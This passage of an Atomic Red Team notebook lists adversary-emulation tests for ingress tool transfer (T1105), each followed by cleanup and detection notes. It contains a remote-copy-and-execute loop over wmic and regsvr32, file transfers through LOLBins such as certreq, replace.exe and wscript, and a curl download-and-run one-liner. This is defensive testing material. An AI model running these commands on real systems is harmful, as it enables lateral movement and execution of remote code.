    "```powershell\n$machine_list = \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105MachineList.txt\"\n$offline_list = \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105OfflineHosts.txt\"\n$completed_list = \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105CompletedHosts.txt\"\nforeach ($machine in get-content -path \"$machine_list\")\n{if (test-connection -Count 1 -computername $machine -quiet) \n{cmd /c copy \"$env:comspec\" \"\\\\$machine\\C$\\Windows\\Temp\\T1105.exe\"\necho $machine >> \"$completed_list\"\nwmic /node: \"$machine\" process call create \"regsvr32.exe /i C:\\Windows\\Temp\\T1105.exe\"}\nelse\n{echo $machine >> \"$offline_list\"}}\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b544efd7",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1105 -TestNumbers 21"
  },
  {
   "cell_type": "markdown",
   "id": "91edc92c",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nif (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105CompletedHosts.txt\") \n{foreach ($machine in get-content -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105CompletedHosts.txt\")\n{wmic /node: \"$machine\" process where name='\"regsvr32.exe\"' call terminate | out-null\nRemove-Item -path \"\\\\$machine\\C$\\Windows\\Temp\\T1105.exe\" -force -erroraction silentlycontinue}}\nRemove-Item -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105OfflineHosts.txt\" -erroraction silentlycontinue\nRemove-item -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105CompletedHosts.txt\" -erroraction silentlycontinue\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "56e9b743",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1105 -TestNumbers 21 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "d8e53150",
   "metadata": {},
   "source": [
    "### Atomic Test #22 - Printer Migration Command-Line Tool UNC share folder into a zip file",
    "Create a ZIP file from a folder in a remote drive\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\ndel %TEMP%\\PrintBrm.zip >nul 2>&1 \nC:\\Windows\\System32\\spool\\tools\\PrintBrm.exe -b -d \\\\127.0.0.1\\c$\\AtomicRedTeam\\atomics\\T1105\\src\\  -f %TEMP%\\PrintBrm.zip -O FORCE\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3d7560bd",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1105 -TestNumbers 22"
  },
  {
   "cell_type": "markdown",
   "id": "f7a62738",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\ndel %TEMP%\\PrintBrm.zip >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7e8596b0",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1105 -TestNumbers 22 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "2a9c79cb",
   "metadata": {},
   "source": "### Atomic Test #23 - Lolbas replace.exe use to copy file\nCopy file.cab to destination\nReference: https://lolbas-project.github.io/lolbas/Binaries/Replace/\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: #{replace_cab} must exist on system.\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path \"PathToAtomicsFolder\\T1105\\src\\redcanary.cab\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nNew-Item -Type Directory (split-path \"PathToAtomicsFolder\\T1105\\src\\redcanary.cab\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/redcanary.cab\" -OutFile \"PathToAtomicsFolder\\T1105\\src\\redcanary.cab\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d0c507e2",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1105 -TestNumbers 23 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "4acfd72f",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\ndel %TEMP%\\redcanary.cab >nul 2>&1\nC:\\Windows\\System32\\replace.exe \"PathToAtomicsFolder\\T1105\\src\\redcanary.cab\" %TEMP% /A\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f3ded4f8",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1105 -TestNumbers 23"
  },
  {
   "cell_type": "markdown",
   "id": "c737dce3",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\ndel %TEMP%\\redcanary.cab >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b1af2a30",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1105 -TestNumbers 23 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "fc12f528",
   "metadata": {},
   "source": [
    "### Atomic Test #24 - Lolbas replace.exe use to copy UNC file",
    "Copy UNC file to destination\nReference: https://lolbas-project.github.io/lolbas/Binaries/Replace/\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\ndel %TEMP%\\redcanary.cab >nul 2>&1\nC:\\Windows\\System32\\replace.exe \\\\127.0.0.1\\c$\\AtomicRedTeam\\atomics\\T1105\\src\\redcanary.cab %TEMP% /A\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d64887c8",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1105 -TestNumbers 24"
  },
  {
   "cell_type": "markdown",
   "id": "046b71ef",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\ndel %TEMP%\\redcanary.cab >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a0dad8df",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1105 -TestNumbers 24 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "38a3f654",
   "metadata": {},
   "source": [
    "### Atomic Test #25 - certreq download",
    "Use certreq to download a file from the web",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\ncertreq.exe -Post -config https://example.com c:\\windows\\win.ini %temp%\\Atomic-license.txt```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "416663ea",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1105 -TestNumbers 25"
  },
  {
   "cell_type": "markdown",
   "id": "9c14d5fe",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\ndel %temp%\\Atomic-license.txt >nul 2>&1```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5d942240",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1105 -TestNumbers 25 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "2143aefe",
   "metadata": {},
   "source": "### Atomic Test #26 - Download a file using wscript\nUse wscript to run a local VisualBasic file to download a remote file\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: #{vbscript_file} must be exist on system.\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path \"PathToAtomicsFolder\\T1105\\src\\T1105-download-file.vbs\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nNew-Item -Type Directory (split-path \"PathToAtomicsFolder\\T1105\\src\\T1105-download-file.vbs\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/T1105-download-file.vbs\" -OutFile \"PathToAtomicsFolder\\T1105\\src\\T1105-download-file.vbs\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2f08a015",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1105 -TestNumbers 26 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "bc5ace4b",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nwscript.exe \"PathToAtomicsFolder\\T1105\\src\\T1105-download-file.vbs\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3f26e756",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1105 -TestNumbers 26"
  },
  {
   "cell_type": "markdown",
   "id": "7bc0e241",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\ndel Atomic-License.txt >nul 2>&1```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5c880ddd",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1105 -TestNumbers 26 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "a5a8c7e7",
   "metadata": {},
   "source": [
    "### Atomic Test #27 - Linux Download File and Run",
    "Utilize linux Curl to download a remote file, chmod +x it and run it.\n",
    "**Supported Platforms:** linux",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\ncurl -sO https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/src/atomic.sh; chmod +x atomic.sh | bash atomic.sh\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "87ffb52a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1105 -TestNumbers 27"
  },
  {
   "cell_type": "markdown",
   "id": "027cebb9",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nrm atomic.sh\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "63071edb",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1105 -TestNumbers 27 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "181f4bef",
   "metadata": {},
   "source": "### Atomic Test #28 - Nimgrab - Transfer Files\nUse nimgrab.exe to download a file from the web. \n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: NimGrab must be installed on system.\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\nimgrab.exe\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://nim-lang.org/download/nim-1.6.6_x64.zip\" -Outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\nim.zip\"\nExpand-Archive -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\nim.zip\" -DestinationPath \"PathToAtomicsFolder\\..\\ExternalPayloads\\nim\" -Force\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\nim\\nim-1.6.6\\bin\\nimgrab.exe\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\nimgrab.exe\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8cfefdcf",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1105 -TestNumbers 28 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "1b0904e9",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\ncmd /c \"PathToAtomicsFolder\\..\\ExternalPayloads\\nimgrab.exe\" https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt $env:TEMP\\Atomic-license.txt\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "15a5b232",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1105 -TestNumbers 28"
  },
  {
   "cell_type": "markdown",
   "id": "bfee1c45",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\ndel $env:TEMP\\Atomic-license.txt >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "cbf42582",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1105 -TestNumbers 28 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "8e53d719",
   "metadata": {},
   "source": [
    "### Atomic Test #29 - iwr or Invoke Web-Request download",
    "Use 'iwr' or \"Invoke-WebRequest\" -URI argument to download a file from the web. Note: without -URI also works in some versions.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\npowershell.exe iwr -URI https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -Outfile %temp%\\Atomic-license.txt\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "68b37db8",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1105 -TestNumbers 29"
  },
  {
   "cell_type": "markdown",
   "id": "fef83b19",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\ndel %temp%\\Atomic-license.txt >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a752ca1a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1105 -TestNumbers 29 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "b44e530b",
   "metadata": {},
   "source": "## Detection\nMonitor for file creation and files transferred into the network. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as [ftp](https://attack.mitre.org/software/S0095), that does not normally occur may also be suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Specifically, for the finger utility on Windows and Linux systems, monitor command line or terminal execution for the finger command. Monitor network activity for TCP port 79, which is used by the finger utility, and Windows <code>netsh interface portproxy</code> modifications to well-known ports such as 80 and 443. Furthermore, monitor file system for the download/creation and execution of suspicious files, which may indicate adversary-downloaded payloads. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)"
  },
  {
   "cell_type": "markdown",
   "id": "dfd7d7ab",
   "metadata": {},
   "source": "\n## Shield Active Defense\n### PCAP Collection \n Collect full network traffic for future research and analysis. \n\n PCAP Collection allows a defenders to use the data to examine an adversary\u2019s network traffic more closely, including studying if it is encoded and/or encrypted. PCAP can be run through tools to replay the traffic to get a real-time view of what happened over the wire. These tools can also parse the traffic and send results to a SIEM for monitoring and alerting.\n#### Opportunity\nThere is an opportunity to collect network data and analyze the adversary activity it contains.\n#### Use Case\nCollecting full packet capture of all network traffic allows you to review what happened over the connection and identify command and control traffic and/or exfiltration activity.\n#### Procedures\nCollect PCAP on a decoy network to improve visibility into an adversary's network activity.\n"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}